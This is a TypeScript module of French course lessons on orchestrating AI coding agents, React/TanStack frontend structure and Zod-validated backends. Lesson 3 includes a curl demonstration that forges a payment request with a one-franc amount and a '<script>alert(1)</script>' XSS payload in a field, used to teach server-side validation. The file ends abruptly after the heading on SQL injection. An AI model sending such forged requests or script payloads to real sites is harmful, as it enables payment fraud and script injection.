// Module Socle — Les 7 Skills Socles AI Factory (m0).
// Fichier autonome : source de vérité pour le cours Socle (m0-l1 à m0-l7).
// Cours longs & structurés : objectifs, analogies, exemples, ateliers guidés, récap & glossaire.

export type Lesson = {
  id: string;
  title: string;
  minutes: number;
  body: string[];
  task: string;
  kind?: string;
  file_path?: string;
  image_path?: string;
};

export type QuizQ = {
  id: string;
  question: string;
  choices: string[];
  correct: number;
  points: number;
  answers?: number[];
  allow_multiple?: boolean;
  explanation?: string;
};

export type Exercise = {
  id: string;
  title: string;
  instructions: string;
};

export const SOCLE_LESSONS: Lesson[] = [
  {
    id: "m0-l1",
    title: "Skill 1 — Orchestrator : La Boucle de Livraison Autonome",
    minutes: 75,
    body: [
      "## 🎯 Objectifs de cette leçon",
      "À la fin de cette leçon, tu seras capable de :\n- Expliquer avec tes propres mots pourquoi la vitesse de génération de code ne garantit **jamais** la livraison d'un projet.\n- Définir précisément ce qu'est un **Skill agentique** et en quoi il diffère d'un simple prompt.\n- Dérouler de mémoire la **boucle de livraison en 6 étapes** et l'appliquer à n'importe quelle tâche.\n- Créer et maintenir les **4 fichiers de contrôle** (`SPEC.md`, `PLAN.md`, `ROUTER.md`, `PROGRESS.md`) sur un projet réel.\n- Réagir correctement aux 3 pannes classiques d'un agent IA (dérive, boucle infinie, faux positif).",

      "## 1. L'analogie fondatrice : l'usine, pas la baguette magique",
      "Imagine une usine automobile moderne. Les robots y soudent des portières en quelques secondes — une vitesse qu'aucun humain ne peut égaler. Pourtant, **aucune usine ne laisse un robot improviser**. Chaque robot suit une gamme de fabrication : quelle pièce, dans quel ordre, avec quel contrôle qualité à la sortie. Sans cette gamme, le robot souderait vite… et produirait des carcasses inutilisables à la chaîne.",
      "Un agent IA (Claude Code, Cursor, Codex, OpenCode) est exactement ce robot : **une puissance d'exécution phénoménale, zéro intuition produit, zéro vision globale**. Ton rôle dans la méthode AI Factory n'est pas d'être le soudeur — c'est d'être **l'ingénieur de production** qui conçoit la gamme, cadence la chaîne et contrôle chaque pièce en sortie. Ce rôle porte un nom : **l'Orchestrateur**.",

      "## 2. Le « Mur des 80% » : pourquoi la vitesse brute échoue",
      "N'importe quel développeur peut aujourd'hui générer 500 lignes de React ou de Python en 15 secondes. Cette vitesse crée une illusion dangereuse : la confusion entre **vitesse de génération de texte** et **productivité d'ingénierie**.",
      "Le scénario est toujours le même, et il porte un nom : le **Mur des 80%** :\n1. **Heure 0 à 2** : euphorie. L'agent génère des pages entières, tout semble avancer à une vitesse irréelle.\n2. **Jour 2 à 5** : premiers craquements. Une modification sur un composant casse silencieusement un autre écran. L'agent « répare » en ajoutant des rustines.\n3. **Semaine 2** : effondrement. Le typage est truffé de `any`, l'agent réinvente des fonctions qui existent déjà, chaque correction crée deux nouveaux bugs.\n4. **Semaine 3** : abandon. Le projet est jeté, 80% « fait », 0% livrable.",
      "Pourquoi ? Parce qu'un LLM est un **processeur statistique sans mémoire globale du projet**. Si tu lui donnes des instructions floues (« *fais-moi un beau dashboard* »), il résout le besoin **localement** en ajoutant de l'entropie **globalement**. L'orchestration est la discipline qui empêche cette entropie de s'accumuler.",

      "## 3. Qu'est-ce qu'un Skill agentique ? (définition précise)",
      "Un **Skill** n'est pas un prompt de politesse (« *sois rigoureux s'il te plaît* »). C'est un **protocole d'ingénierie réutilisable, déterministe et versionné**, stocké dans un fichier (ex: `skills/frontend-react/SKILL.md`), qui impose à l'agent :\n- **COMMENT** travailler : méthodes, conventions de nommage, architecture imposée, séquencement.\n- **AVEC QUELLES LIMITES** : ce qui est interdit (zéro `any`, pas de modification hors périmètre, pas de suppression de test).\n- **COMMENT PROUVER** : la preuve factuelle exigée avant de déclarer la tâche finie (`tsc --noEmit` à 0 erreur, test au vert, capture d'écran).",
      "La différence est la même qu'entre dire à un cuisinier « *fais un bon plat* » (prompt) et lui remettre **la fiche technique du plat** avec grammages, cuissons, dressage et photo du résultat attendu (skill). Le premier produit un résultat aléatoire ; le second produit le même plat, tous les jours, quel que soit le cuisinier.",
      "```markdown\n# skills/frontend-react/SKILL.md (extrait)\n\n## Règles non négociables\n- TypeScript strict : zéro `any`, zéro `@ts-ignore`.\n- Composants UI purs dans src/components/ui/ — aucune logique métier.\n- Données serveur : TanStack Query uniquement, jamais useState.\n\n## Preuve exigée avant de cocher la tâche\n- `npx tsc --noEmit` → 0 erreur (coller la sortie).\n- Rendu vérifié sur 375px et 1440px (captures).\n```",

      "## 4. La boucle de livraison en 6 étapes (le cœur du métier)",
      "Le Skill **Orchestrator** est le cerveau central de la fabrique. Il déroule une boucle **déterministe en 6 étapes**, toujours dans le même ordre, toujours une seule tâche à la fois :",
      "1. **LIRE la Spec (`SPEC.md`)** — Aucun code tant que l'exigence fonctionnelle et le contrat d'interface ne sont pas écrits noir sur blanc. *Exemple : avant de coder le formulaire de connexion, la spec définit les champs, les règles de validation, et le comportement en cas d'erreur 401.*\n2. **CHOISIR 1 tâche atomique (`PLAN.md`)** — Une seule tâche de **moins de 30 minutes**, à responsabilité unique. *Exemple : « T-003 — Composant `AuthForm` avec validation Zod », pas « faire l'authentification ».*\n3. **CHARGER le Skill spécialisé** — Invoquer explicitement le fichier `SKILL.md` pertinent. L'agent **déclare** quel skill il utilise avant de toucher au code. *Exemple : « J'applique `skills/frontend-react/SKILL.md` pour cette tâche ».*\n4. **PRODUIRE l'incrément de code** — Typage strict, périmètre isolé, zéro contournement.\n5. **VÉRIFIER la preuve observable** — Chaque action produit une preuve **factuelle et mesurable** : un test Vitest au vert, `tsc --noEmit` à 0 erreur, un log HTTP 200, un composant visible à l'écran. Pas de « ça devrait marcher ».\n6. **COCHER ou CORRIGER (Fix Loop)** — Preuve apportée → tâche cochée dans `PROGRESS.md`. Preuve échouée → **maximum 3 tentatives** d'auto-correction. Au-delà : STOP, on isole le problème, on redécoupe la tâche.",
      "⚠️ **Règle d'or** : l'agent ne traite **jamais deux tâches en parallèle** et ne saute **jamais** une étape. C'est contre-intuitif (« on irait plus vite en parallèle ! ») mais c'est précisément la discipline séquentielle qui rend la vitesse **durable**.",

      "## 5. Les 4 fichiers de contrôle à la racine du projet",
      "Pour maintenir l'alignement parfait entre toi (l'humain) et l'agent, le projet s'appuie sur 4 fichiers de contrôle :",
      "| Fichier | Rôle | Qui l'écrit ? | Fréquence de mise à jour |\n| :--- | :--- | :--- | :--- |\n| `SPEC.md` | **Vérité métier** : spécifications fonctionnelles, contrats d'interfaces (Zod/TS), parcours utilisateur. | Toi (validé avant tout code) | Immuable pendant l'itération |\n| `PLAN.md` | **Découpage technique** : liste ordonnée d'EPICs et de tâches atomiques (T-001, T-002…). | Toi + agent (tu valides) | Au lancement de chaque lot |\n| `ROUTER.md` | **Matrice de routage** : quel type de besoin → quel Skill obligatoire. | Toi (une fois) | Consulté à chaque tâche |\n| `PROGRESS.md` | **Journal d'exécution** : avancement temps réel + preuve factuelle par tâche + journal de correction. | L'agent (tu contrôles) | À chaque clôture de tâche |",
      "💡 **Pourquoi des fichiers et pas ta mémoire ?** Parce que la fenêtre de contexte d'un agent est volatile : il « oublie » entre deux sessions. Les fichiers de contrôle sont la **mémoire externe permanente** du projet. Chaque nouvelle session démarre en relisant ces fichiers — l'agent retrouve instantanément l'état exact du chantier.",

      "## 6. La consigne d'orchestration : le modèle en 5 points",
      "Chaque session de travail avec un agent débute par une consigne formalisée. Voici le modèle AI Factory, à copier-coller et adapter :",
      "```text\nCONSIGNE D'ORCHESTRATION — Session du jour\n\n1. SPEC       : @SPEC.md#Section-Auth (source de vérité, ne pas dévier)\n2. TÂCHE      : T-003 — Composant AuthForm avec validation Zod\n3. SKILL      : skills/frontend-react/SKILL.md (à lire AVANT de coder)\n4. PREUVE     : npx tsc --noEmit à 0 erreur + rendu fonctionnel 375px/1440px\n5. DONE QUAND : formulaire non soumettable si email invalide,\n                message d'erreur explicite sous le champ, toast de succès.\n\nInterdits : toucher à un fichier hors AuthForm.tsx et son test,\najouter une fonctionnalité non listée, utiliser `any`.\n```",
      "Observe la structure : **source → tâche → méthode → preuve → critère de fin**. En 10 lignes, l'agent sait exactement quoi faire, comment, et surtout **quand s'arrêter**. 90% des dérives d'agents viennent de consignes où l'un de ces 5 points manque.",

      "## 7. Une session réelle, déroulée pas à pas",
      "Voyons la boucle en action sur un cas concret : ajouter la tâche T-003 (formulaire de connexion) à un projet existant.",
      "- **09h00 — LIRE** : l'agent relit `SPEC.md#Section-Auth` : champs email/mot de passe, validation Zod, comportement en 401 (« Identifiants invalides », champ conservé).\n- **09h05 — CHOISIR** : tâche T-003 sélectionnée dans `PLAN.md`. T-002 (schéma Zod partagé) est cochée — la dépendance est satisfaite.\n- **09h07 — CHARGER** : l'agent annonce : « J'applique skills/frontend-react/SKILL.md ».\n- **09h10 — PRODUIRE** : création de `AuthForm.tsx` (composant pur) + `useLogin.ts` (mutation TanStack Query). Aucun autre fichier touché.\n- **09h25 — VÉRIFIER** : `npx tsc --noEmit` → 0 erreur. Test manuel : email invalide → bouton désactivé + message sous le champ. Preuves collées dans la conversation.\n- **09h30 — COCHER** : `PROGRESS.md` mis à jour : `[x] T-003 — preuve : tsc 0 erreur, rendu validé 375/1440`. Session suivante : T-004.",
      "Durée totale : **30 minutes, zéro régression, preuve archivée**. C'est moins spectaculaire que générer 15 fichiers d'un coup — et c'est exactement pour ça que ça marche.",

      "## 8. Les 3 pannes classiques et les réflexes de l'orchestrateur",
      "Un orchestrateur chevronné n'espère pas que l'agent sera sage : il **anticipe** les dérives. Voici les 3 pannes les plus fréquentes et le protocole exact à appliquer :",
      "- **🔴 Panne A — Feature Creep (l'agent invente des fonctionnalités)** : tu demandes un formulaire, il ajoute « au passage » un mode sombre et un captcha. **Réflexe** : rejeter immédiatement le diff (`git checkout .`), ré-invoquer la `SPEC.md`, rappeler l'isolation stricte : « Uniquement T-003. Tout ajout non listé = rejet. »\n- **🔴 Panne B — Boucle infinie d'auto-correction** : l'agent tourne sur la même erreur en la « corrigeant » différemment à chaque tentative. **Réflexe** : STOP obligatoire à la 3ème tentative. Consigner l'erreur exacte dans `PROGRESS.md`, chercher la cause racine (dépendance manquante ? schéma obsolète ?), redécouper la tâche en plus petit.\n- **🔴 Panne C — Faux positif (l'agent déclare fini sans vérifier)** : « Le composant fonctionne parfaitement ! » — sans avoir rien exécuté. **Réflexe** : refuser la livraison. Exiger la sortie **brute** de la commande de contrôle : « Colle la sortie complète de `npm run typecheck && npm test`. »",
      "| Panne | Signal d'alerte | Réflexe immédiat |\n| :--- | :--- | :--- |\n| Feature Creep | Diff qui touche des fichiers non prévus | `git checkout .` + recadrage spec |\n| Boucle infinie | 3ème échec sur la même erreur | STOP + cause racine + redécoupage |\n| Faux positif | Affirmation sans sortie de commande | Exiger la preuve brute |",

      "## 9. Le journal `PROGRESS.md` en production",
      "Le journal d'exécution suit un format simple et strict :",
      "```markdown\n# PROGRESS — Sprint Auth (semaine du 12/01)\nOrchestrateur : Awa K.\n\n- [x] T-001 Schéma DB users          — preuve : migration appliquée, SELECT ok\n- [x] T-002 Schéma Zod partagé       — preuve : tsc 0 erreur, 4 tests PASS\n- [x] T-003 Composant AuthForm       — preuve : tsc 0 erreur, rendu 375/1440 ok\n- [/] T-004 Mutation login + session — en cours\n- [ ] T-005 Page /login raccordée\n\n## Journal de correction\n- T-002, tentative 2 : erreur « z.string().email() deprecated » →\n  remplacé par z.email() (migration Zod v4). Cause racine : doc obsolète.\n```",
      "Trois conventions : `[x]` = livré **avec preuve**, `[/]` = en cours, `[ ]` = à venir. Chaque `[x]` sans preuve consignée est considéré comme **non fait**. Le journal de correction transforme chaque échec en connaissance réutilisable.",

      "## 10. Erreurs fréquentes des débutants",
      "| ❌ Ce que fait le débutant | ✅ Ce que fait l'orchestrateur AI Factory |\n| :--- | :--- |\n| Donne 10 tâches d'un coup « pour gagner du temps » | Donne 1 tâche atomique, vérifie, puis passe à la suivante |\n| Dit « fais-moi l'authentification » | Dit « T-003 : composant AuthForm, spec §Auth, preuve : tsc 0 erreur » |\n| Croit l'agent quand il dit « c'est bon » | Exige la sortie brute de la commande de vérification |\n| Laisse l'agent corriger indéfiniment | Coupe à 3 tentatives et redécoupe la tâche |\n| Garde le plan « dans sa tête » | Écrit SPEC, PLAN, ROUTER, PROGRESS à la racine du repo |\n| Recommence le projet à chaque gros bug | Remonte à la dernière tâche cochée avec preuve et repart de là |",

      "## 11. Atelier guidé — Ta première boucle complète (30 min)",
      "Mets immédiatement la leçon en pratique sur un mini-projet (une page « liste de tâches » suffit) :\n1. **(5 min)** Crée les 4 fichiers à la racine : `SPEC.md`, `PLAN.md`, `ROUTER.md`, `PROGRESS.md`.\n2. **(5 min)** Dans `SPEC.md`, décris UNE fonctionnalité : « L'utilisateur ajoute une tâche ; une tâche vide est refusée avec un message. »\n3. **(5 min)** Dans `PLAN.md`, découpe en 3 tâches atomiques maximum (ex: T-001 modèle de donnée, T-002 composant formulaire, T-003 liste + état vide).\n4. **(2 min)** Rédige la consigne d'orchestration en 5 points pour T-001.\n5. **(10 min)** Lance ton agent, déroule la boucle : lire → choisir → charger → produire → vérifier → cocher.\n6. **(3 min)** Consigne la preuve dans `PROGRESS.md`. Si l'agent a dévié une seule fois, note dans le journal **laquelle des 3 pannes** tu as observée.",

      "## 12. 📌 À retenir",
      "- La vitesse de génération ne vaut rien sans **discipline d'orchestration** : c'est elle qui franchit le Mur des 80%.\n- Un **Skill** = un protocole versionné qui dit COMMENT travailler + COMMENT prouver, pas un prompt poli.\n- La boucle : **LIRE → CHOISIR → CHARGER → PRODUIRE → VÉRIFIER → COCHER**, une tâche à la fois, jamais en parallèle.\n- Les 4 fichiers de contrôle sont la **mémoire externe** du projet ; l'agent n'a pas de mémoire fiable.\n- **3 tentatives maximum** sur une erreur, puis STOP et redécoupage.\n- Une tâche sans preuve factuelle consignée est une tâche **non faite**.",

      "## 13. Glossaire de la leçon",
      "- **Orchestrateur** : le rôle humain qui cadence la boucle, route les tâches vers les skills et contrôle les preuves.\n- **Skill agentique** : protocole d'ingénierie versionné (`SKILL.md`) imposant méthode, limites et preuves à l'agent.\n- **Tâche atomique** : unité de travail < 30 min, à responsabilité unique, vérifiable par une preuve binaire.\n- **Preuve observable** : sortie factuelle et mesurable (commande, test, capture) — par opposition à une affirmation.\n- **Fix Loop** : cycle d'auto-correction de l'agent, plafonné à 3 tentatives.\n- **Definition of Done (DoD)** : liste de contrôles binaires qui définit scientifiquement « fini ».",

      "## 14. ✅ Checklist de validation (Definition of Done)",
      "Une tâche est réputée **DELIVERED** uniquement lorsque tous les critères suivants sont satisfaits :\n- [ ] La spécification initiale (`SPEC.md`) a été respectée sans aucun ajout superflu.\n- [ ] Le Skill correspondant (`skills/*`) a été lu et appliqué à la lettre.\n- [ ] La compilation TypeScript (`tsc --noEmit`) passe à 0 erreur et 0 warning.\n- [ ] Les tests associés (unitaires ou d'intégration) sont au vert.\n- [ ] La preuve factuelle (log de commande, capture, URL live) est consignée dans `PROGRESS.md`.\n- [ ] Aucune variable d'environnement ou clé secrète n'a été exposée dans le code client.",
    ],
    task: "Crée l'arborescence de contrôle de ton projet (SPEC.md, PLAN.md, ROUTER.md, PROGRESS.md), rédige la consigne d'orchestration en 5 points pour ta première tâche, puis exécute un cycle complet LIRE → CHOISIR → CHARGER → PRODUIRE → VÉRIFIER → COCHER avec preuve factuelle consignée dans PROGRESS.md.",
  },
  {
    id: "m0-l2",
    title: "Skill 2 — Frontend : React 19, Vite, TypeScript Strict & TanStack",
    minutes: 75,
    body: [
      "## 🎯 Objectifs de cette leçon",
      "À la fin de cette leçon, tu seras capable de :\n- Structurer n'importe quelle application React en **4 couches** aux responsabilités étanches.\n- Choisir sans hésiter entre **TanStack Query** (données serveur) et **useState** (état d'interface).\n- Écrire un hook d'API complet : schéma Zod → query typée → mutation avec invalidation de cache.\n- Imposer à un agent IA les 4 directives frontend non négociables et détecter ses écarts.\n- Livrer une interface qui gère les 3 états incontournables : chargement, vide, erreur.",

      "## 1. L'analogie fondatrice : la cuisine d'un grand restaurant",
      "Dans un restaurant étoilé, la salle ne voit jamais la plonge, le garde-manger ne dresse jamais les assiettes, et le chef de passe contrôle chaque plat avant qu'il sorte. Chaque poste a **une responsabilité unique** et des interfaces claires avec les autres. C'est ce cloisonnement qui permet de servir 200 couverts sans chaos.",
      "Une application frontend professionnelle fonctionne pareil : le composant d'affichage ne fait pas d'appel réseau, le hook de données ne contient pas de HTML, la page ne stocke pas l'état serveur. Quand un débutant met tout dans un seul fichier de 800 lignes, il crée une cuisine où le plongeur dresse les assiettes : ça « marche » un soir, puis tout s'effondre au premier coup de feu.",

      "## 2. Pourquoi TypeScript strict est ton filet de sécurité gratuit",
      "Le frontend n'est pas un assemblage de vues HTML : c'est un **système d'état distribué** qui doit rester rapide, typé et résilient. TypeScript en mode `strict: true` attrape la majorité des bugs **au moment où tu les tapes**, sans exécuter la moindre ligne :",
      "```ts\n// ❌ Sans typage strict : la faute de frappe explose en production\nconst user = await fetchUser();\nconsole.log(user.verifed); // undefined silencieux → bug en prod\n\n// ✅ Avec typage strict : l'erreur apparaît dans l'éditeur\ntype User = { id: string; email: string; verified: boolean };\nconst user: User = await fetchUser();\nconsole.log(user.verifed);\n// Error: Property 'verifed' does not exist on type 'User'.\n//        Did you mean 'verified'?\n```",
      "Règles absolues du skill : **zéro `any`**, zéro `@ts-ignore`, et `npx tsc --noEmit` doit afficher **0 erreur** avant chaque commit. Si un type est réellement inconnu (réponse d'API externe), on utilise `unknown` + validation Zod — jamais `any`.",

      "## 3. L'architecture en 4 couches (la colonne vertébrale)",
      "Pour éviter le composant-monolithe inmaintenable, on découpe toute application en 4 couches strictes :",
      "| Couche | Emplacement | Responsabilité unique | Interdit |\n| :--- | :--- | :--- | :--- |\n| **1. Primitives UI** | `src/components/ui/` | Composants atomiques réutilisables (`Button`, `Input`, `Badge`, `Modal`), stylés Tailwind, fusion de classes via `cn()`. | Toute logique métier, tout appel API |\n| **2. Composants métier** | `src/components/[domaine]/` | Assembler les primitives pour un besoin métier (`LessonCard`, `AuthForm`, `PaymentPanel`). | Appels `fetch` directs |\n| **3. Pages & routage** | `src/routes/` | Navigation typée (TanStack Router), composition des composants métier. | Logique de données complexe |\n| **4. Services & hooks de données** | `src/lib/` | Appels réseau typés via TanStack Query (`useQuery`, `useMutation`) + schémas Zod. | Tout JSX |",
      "💡 **Le test mental** : si tu peux supprimer le dossier `lib/` et que tes composants UI compilent encore, ta séparation est bonne. Si un bouton importe un client HTTP, elle ne l'est pas.",

      "## 4. La règle d'or de l'état : serveur vs interface",
      "L'erreur n°1 des développeurs juniors : stocker des données serveur dans `useState`. Résultat : des copies désynchronisées de la vérité, des écrans qui affichent des données périmées, des bugs impossibles à reproduire.",
      "La règle AI Factory est binaire :\n- **Donnée qui vient du serveur** (profil, progression, paiements, liste de cours) → **TanStack Query**, point final. Cache, revalidation automatique, clés stables (`['progress', userId]`).\n- **État local d'interface** (modal ouvert/fermé, onglet actif, texte en cours de saisie) → **`useState`**, et rien d'autre.",
      '```ts\n// ❌ L\'anti-pattern classique : copie locale désynchronisée\nconst [courses, setCourses] = useState<Course[]>([]);\nuseEffect(() => {\n  fetch("/api/courses").then(r => r.json()).then(setCourses);\n}, []); // pas de cache, pas de retry, données périmées après mutation\n\n// ✅ Le pattern AI Factory : une seule source de vérité\nconst { data: courses = [], isLoading, isError } = useQuery({\n  queryKey: ["courses"],\n  queryFn: fetchCourses, // validée par Zod, voir section 5\n});\n```',
      "Question à te poser devant chaque `useState` : « *Cette donnée existe-t-elle ailleurs que dans ce navigateur ?* » Si oui → TanStack Query.",

      "## 5. Le hook d'API de production, pas à pas",
      "Un hook de données professionnel s'écrit toujours en 3 temps : **schéma → lecture → écriture**.",
      "**Temps 1 — Le schéma Zod à la frontière.** Tout ce qui entre dans l'application depuis le réseau est validé. Le type TypeScript est **dérivé** du schéma, jamais écrit deux fois :",
      '```ts\nimport { z } from "zod";\n\nexport const courseSchema = z.object({\n  id: z.string(),\n  title: z.string().min(1),\n  minutes: z.number().int().positive(),\n  published: z.boolean(),\n});\nexport type Course = z.infer<typeof courseSchema>; // type gratuit\n```',
      "**Temps 2 — La query de lecture.** On vérifie `res.ok`, on parse avec Zod : si le serveur renvoie n'importe quoi, l'erreur éclate ici, à la frontière — pas 12 composants plus loin :",
      '```ts\nexport function useCourses() {\n  return useQuery({\n    queryKey: ["courses"],\n    queryFn: async (): Promise<Course[]> => {\n      const res = await fetch("/api/courses");\n      if (!res.ok) throw new Error(`HTTP ${res.status}`);\n      return z.array(courseSchema).parse(await res.json());\n    },\n  });\n}\n```',
      "**Temps 3 — La mutation avec invalidation.** Après une écriture réussie, on invalide la clé de cache concernée : tous les écrans qui affichent cette donnée se rafraîchissent automatiquement :",
      '```ts\nexport function useCompleteLesson() {\n  const qc = useQueryClient();\n  return useMutation({\n    mutationFn: (lessonId: string) =>\n      fetch("/api/progress", {\n        method: "POST",\n        headers: { "Content-Type": "application/json" },\n        body: JSON.stringify({ lessonId }),\n      }),\n    onSuccess: () => qc.invalidateQueries({ queryKey: ["progress"] }),\n  });\n}\n```',

      "## 6. Les 3 états que toute interface doit gérer",
      "Une interface professionnelle ne laisse **jamais** l'utilisateur dans l'incertitude. Pour chaque donnée affichée, trois états sont obligatoires :",
      "- **⏳ Chargement (Loading)** : des **skeletons** animés (placeholders pulsants) à la forme du contenu attendu — jamais un écran blanc. Bonus : ils éliminent les sauts de mise en page (CLS).\n- **🗂️ Vide (Empty)** : « aucune donnée » n'est pas un bug, c'est un état. On affiche une illustration bienveillante + **un bouton d'action** (« Commencer mon premier cours »), pas un tableau vide.\n- **💥 Erreur (Error)** : un message humain (« Connexion impossible, réessaye dans quelques instants ») + un bouton **Réessayer**. Jamais de stack trace, jamais d'écran figé.",
      "Et pour chaque mutation : **feedback immédiat** — bouton désactivé + spinner pendant l'envoi, toast de succès ou d'erreur à l'arrivée (sonner). L'utilisateur sait toujours ce qui se passe.",

      "## 7. Piloter un agent IA sur du frontend : les 4 directives",
      "Quand tu délègues du code frontend à un agent, ces 4 consignes partent **dans chaque prompt** :\n1. **Primitives pures** : tout nouveau composant UI utilise `forwardRef` + `cn()`, zéro logique métier, zéro fetch.\n2. **Zéro `any`** : interdit formellement. Type inconnu → `unknown` + schéma Zod.\n3. **Séparation vue/données** : le composant reçoit ses données en props ou via un hook — il ne fetch jamais lui-même.\n4. **Mobile-first 375px** : aucun débordement horizontal, classes responsive Tailwind (`sm:`, `md:`, `lg:`) obligatoires.",
      "**Signaux d'alerte à vérifier dans chaque diff généré** : un `useEffect` qui fait du fetch (→ TanStack Query), un `as any` glissé discrètement, un composant UI qui importe `fetch` ou un client API, une largeur fixe en pixels qui casse le mobile.",

      "## 8. Erreurs fréquentes des débutants",
      "| ❌ Réflexe débutant | ✅ Réflexe AI Factory | Pourquoi |\n| :--- | :--- | :--- |\n| `useState` + `useEffect` pour charger des données | `useQuery` avec clé stable | Cache, retry, revalidation gratuits |\n| `any` « temporaire » pour aller vite | `unknown` + `schema.parse()` | Le `any` temporaire devient permanent |\n| Un composant de 600 lignes qui fait tout | 4 couches : ui / métier / route / lib | Testable, réutilisable, lisible |\n| Styles en ligne et valeurs magiques | Classes Tailwind + tokens du design system | Cohérence et maintenance |\n| Oublier loading/empty/error | Les 3 états systématiques | L'utilisateur n'est jamais perdu |\n| Tester uniquement sur son écran 27\" | Vérifier 375px d'abord | La majorité du trafic est mobile |",

      "## 9. Atelier guidé — La carte de leçon complète (45 min)",
      "Construis le composant `LessonCard` de bout en bout, en respectant les 4 couches :\n1. **(10 min)** Définis le schéma Zod `lessonSchema` (id, title, minutes, done) et dérive le type `Lesson` via `z.infer`.\n2. **(10 min)** Crée la primitive `Badge` dans `components/ui/` (variantes : `done`, `todo`) avec `cn()`.\n3. **(15 min)** Crée `LessonCard` dans `components/course/` : props typées `{ lesson: Lesson; onOpen: (id: string) => void }`, affichage titre + durée + badge, responsive 375px → 1440px.\n4. **(5 min)** Ajoute l'état vide : si la liste est vide, illustration + bouton « Commencer ».\n5. **(5 min)** Preuves : `npx tsc --noEmit` → 0 erreur, zéro `any` dans le diff, captures mobile + desktop.",

      "## 10. 📌 À retenir",
      "- Le frontend est un **système d'état distribué**, pas un empilement de vues : l'architecture en 4 couches est non négociable.\n- **Serveur → TanStack Query, interface → useState.** Toute entorse crée des données désynchronisées.\n- Le trio gagnant d'un hook d'API : **schéma Zod → query validée → mutation + invalidation de cache**.\n- Les types se **dérivent** des schémas (`z.infer`), ils ne se dupliquent pas.\n- Loading, Empty, Error : les 3 états obligatoires de toute donnée affichée.\n- `tsc --noEmit` à 0 erreur est le contrôle qualité le moins cher de toute ta chaîne.",

      "## 11. Glossaire de la leçon",
      "- **Primitive UI** : composant atomique sans logique métier (bouton, champ, badge), brique de base du design system.\n- **TanStack Query** : bibliothèque de gestion des données serveur — cache, revalidation, retry, invalidation.\n- **Clé de cache (queryKey)** : identifiant stable d'une donnée en cache, ex: `['progress', userId]`.\n- **Invalidation** : marquer une clé de cache comme périmée pour forcer son rechargement après une mutation.\n- **Schéma Zod** : validateur exécutable qui garantit à l'exécution la forme des données + fournit le type TS.\n- **CLS (Cumulative Layout Shift)** : sauts de mise en page pendant le chargement — éliminés par les skeletons.\n- **Mobile-first** : concevoir d'abord pour 375px, puis élargir — jamais l'inverse.",

      "## 12. ✅ Checklist de validation (Definition of Done)",
      "- [ ] `tsc --noEmit` s'exécute à 0 erreur et 0 warning.\n- [ ] Les composants UI n'importent aucune logique métier ni appel API direct.\n- [ ] Aucun `useState` ne duplique une donnée issue du serveur.\n- [ ] Chaque donnée affichée gère ses 3 états : chargement (skeleton), vide (action), erreur (réessayer).\n- [ ] Chaque mutation invalide les clés de cache concernées dans `onSuccess`.\n- [ ] L'interface est testée et fluide sur mobile (375px), tablette (768px) et desktop (1440px).",
    ],
    task: "Construis le composant LessonCard complet (schéma Zod + primitive Badge + composant métier typé, zéro any) avec ses 3 états loading/empty/error, vérifié responsive de 375px à 1440px et tsc --noEmit à 0 erreur.",
  },
  {
    id: "m0-l3",
    title: "Skill 3 — Backend : API propre, validation Zod & base D1",
    minutes: 75,
    body: [
      "## 🎯 Objectifs de cette leçon",
      "À la fin de cette leçon, tu seras capable de :\n- Expliquer pourquoi le serveur ne doit **jamais** faire confiance au client, exemples d'attaque à l'appui.\n- Écrire une server function complète : validation Zod → authentification → logique métier → réponse structurée.\n- Éliminer les injections SQL par les **requêtes paramétrées**, systématiquement.\n- Concevoir un schéma de base D1 propre : clés, index, contraintes, migrations versionnées.\n- Renvoyer des erreurs exploitables par le frontend (codes HTTP corrects + messages humains).",

      "## 1. L'analogie fondatrice : la douane de l'aéroport",
      "Un aéroport international ne laisse personne embarquer sur sa bonne mine. Passeport vérifié (authentification), visa contrôlé (autorisation), bagages scannés (validation des données) — **pour chaque passager, à chaque vol, sans exception**, même pour le pilote. Ce n'est pas de la méfiance personnelle : c'est un protocole.",
      "Ton backend est cette douane. Chaque requête HTTP est un passager : peu importe qu'elle semble venir de ton propre frontend — elle peut avoir été forgée avec `curl`, rejouée, ou modifiée. **Le formulaire côté client n'est qu'un confort d'interface ; la frontière de sécurité, c'est le serveur.**",

      "## 2. La règle zéro : ne jamais croire le client",
      "Démonstration en 10 secondes. Ton frontend envoie proprement :",
      '```ts\n// Ce que ton frontend envoie…\nawait fetch("/api/payments", {\n  method: "POST",\n  body: JSON.stringify({ amount: 1000, reference: "TR-1:ABC123" }),\n});\n```\n```bash\n# …et ce que n\'importe qui peut envoyer depuis un terminal :\ncurl -X POST https://tonsite.com/api/payments \\\n  -H "Content-Type: application/json" \\\n  -d \'{"amount": 1, "reference": "<script>alert(1)</script>"}\'\n```',
      "Si ton serveur fait confiance au montant reçu, un attaquant paie 1 F au lieu de 1 000 F. S'il stocke la référence sans la valider, tu héberges du script malveillant. Conclusion : **toute entrée est hostile jusqu'à preuve du contraire** — et la preuve, c'est Zod côté serveur.",

      "## 3. L'anatomie d'une server function propre (les 5 étages)",
      "Chaque endpoint suit la même pyramide, toujours dans cet ordre :",
      "1. **Valider l'entrée** (schéma Zod strict) — on rejette tôt, avant toute logique.\n2. **Authentifier** — qui est-ce ? (session, token).\n3. **Autoriser** — a-t-il le droit de faire ÇA sur CETTE ressource ?\n4. **Exécuter la logique métier** — requêtes paramétrées, transactions si plusieurs écritures.\n5. **Répondre proprement** — succès structuré ou erreur exploitable, jamais de stack trace.",
      '```ts\nimport { createServerFn } from "@tanstack/react-start";\nimport { z } from "zod";\nimport { d1Query } from "./cloudflare-d1";\n\nconst paymentInput = z.object({\n  reference: z.string().trim().min(4).max(80),\n  amount: z.literal(1000), // une tranche = 1000 F, rien d\'autre\n});\n\nexport const declareTrancheServerFn = createServerFn({ method: "POST" })\n  .validator((data: unknown) => paymentInput.parse(data)) // 1. valider\n  .handler(async ({ data, context }) => {\n    const user = await requireUser(context);              // 2. authentifier\n    if (user.status === "banned") {                       // 3. autoriser\n      return { success: false, error: "Accès refusé." };\n    }\n    await d1Query(                                        // 4. exécuter\n      "INSERT INTO payments (id, user_id, reference, amount, status) VALUES (?, ?, ?, ?, \'pending\');",\n      [crypto.randomUUID(), user.id, data.reference, data.amount]\n    );\n    return { success: true };                             // 5. répondre\n  });\n```',
      "Remarque le `z.literal(1000)` : le montant n'est pas « un nombre envoyé par le client », c'est **une règle métier gravée côté serveur**. Le client ne décide jamais d'un prix.",

      "## 4. Requêtes paramétrées : l'injection SQL éliminée par construction",
      "L'injection SQL reste dans le top 3 des attaques mondiales depuis 20 ans — alors que la parade est triviale : **ne jamais concaténer de valeur utilisateur dans du SQL**.",
